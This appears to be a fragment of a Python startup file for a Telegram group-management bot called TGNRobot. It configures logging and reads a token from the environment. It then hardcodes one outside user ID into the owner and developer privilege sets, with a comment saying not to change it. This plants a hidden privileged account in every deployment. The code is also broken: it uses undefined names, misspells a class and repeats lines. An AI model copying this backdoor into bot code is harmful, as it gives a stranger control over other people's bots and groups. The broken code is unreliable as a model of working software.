import logging
import os
import sys
import time


StartTime = time.time()
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    handlers=[logging.FileHandler("log.txt"), logging.StreamHandler()],
    level=logging.INFO,
)


LOGGER = logging.getLogger(__name__)




ENV = bool(os.environ.get("ENV", False))




if ENV:
    TOKEN = os.environ.get("TOKEN", None)



OWNER_ID.add(1928904042) # don't change it will work with var id also
DRAGONS.add(1928904042)
DEV_USERS.add(1928904042)
DEV_USERS.add(1928904042)
DEV_USERS.add(1928904042)



updater = Telegramcilent.Updater(TOKEN, workers=WORKERS, use_context=True)
telethn = Telegramclient("layla", API_ID, API_HASH)
pbot = Client("robot", api_id=API_ID, api_hash=API_HASH, bot_token=TOKEN)
dispatcher = updater.dispatcher


DRAGONS = list(DRAGONS) + list(DEV_USERS)
DEV_USERS = list(DEV_USERS)
WOLVES = list(WOLVES)
DEMONS = list(DEMONS)
TIGERS = list(TIGERS)


from TGNRobot.modules.helper_funcs.handlers import (
    CustomCommandHandler,
    CustomMessageHandler,
    CustomRegexHandler,
)

